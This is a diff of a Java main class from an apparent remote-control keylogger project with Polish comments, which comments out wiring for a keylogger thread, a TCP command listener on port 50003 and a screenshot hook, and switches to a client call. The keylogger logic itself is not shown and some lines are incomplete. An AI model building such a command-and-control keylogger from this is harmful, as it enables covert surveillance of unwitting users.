@@ -16,21 +16,72 @@ import java.util.logging.Logger;
 
 public class Main {
 
+    /*public static final int commandNumber = 1;
+    public static final int listenerNumber = 2;
+    public static BlockingQueue<String> keyloggerCommandsQueue = new ArrayBlockingQueue<String>(20);
+
+    public static void screenshot()
+    {
+
+    }
+
+    public static void sendKeyloggerCommand(String st)
+    {
+        try {
+            keyloggerCommandsQueue.put(st);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }*/
 
     public static void main(String[] args) {
 
-//        ServerSocket svr = null;
-//        try {
-//            svr = new ServerSocket(50003);
-//            Socket connection = svr.accept();
-//            //TODO: zamkniecie polaczenia
-//
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        }
+        var cli = new Client();
+        cli.run();
 
 
-        BlockingQueue<String> test = new ArrayBlockingQueue<String>(10);
+        /*ServerSocket svr = null;
+        try {
+            svr = new ServerSocket(50003);
+            Socket connection = svr.accept(); //TODO: wstawić accept we właściwe miejsce
+
+            BlockingQueue<String> commandQueue = new ArrayBlockingQueue<String>(20);
+            var tcpListenerThread = new Thread(new TCPListener(commandQueue, connection.getInputStream(), commandNumber), "TCPLiestener");
+
+            BlockingQueue<String> dataQueue = new ArrayBlockingQueue<String>(20);
+
+            var keyloggerThread =  new Thread((new Keylogger(dataQueue, keyloggerCommandsQueue, listenerNumber)), "Keylogger");
+
+            var commandParser = new CommandExecutor(Main::screenshot, "screenshot");
+            commandParser.add(new OneCommandConsumer(Main::sendKeyloggerCommand));
+            CommandClientParser queueParser = new CommandClientParser(commandParser, commandNumber);
+
+            var dataParser = new CommandClientParser()
+
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }*/
+
+
+
+
+        /*ServerSocket svr = null;
+        try {
+            svr = new ServerSocket(50003);
+            Socket connection = svr.accept();
+            //TODO: zamkniecie polaczenia
+            var istream = connection.getInputStream();
+            var ostream = connection.getOutputStream();
+            var buf = istream.readNBytes(16);
+            ostream.write(buf);
+            System.out.println("end");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }*/
+
+//To działający keylogger
+        /*BlockingQueue<String> test = new ArrayBlockingQueue<String>(10);
         BlockingQueue<String> commands = new ArrayBlockingQueue<String>(10);
 
 
@@ -67,7 +118,7 @@ public class Main {
             thread.join();
         } catch (InterruptedException e) {
             e.printStackTrace();
-        }
+        }*/
 
 
     }
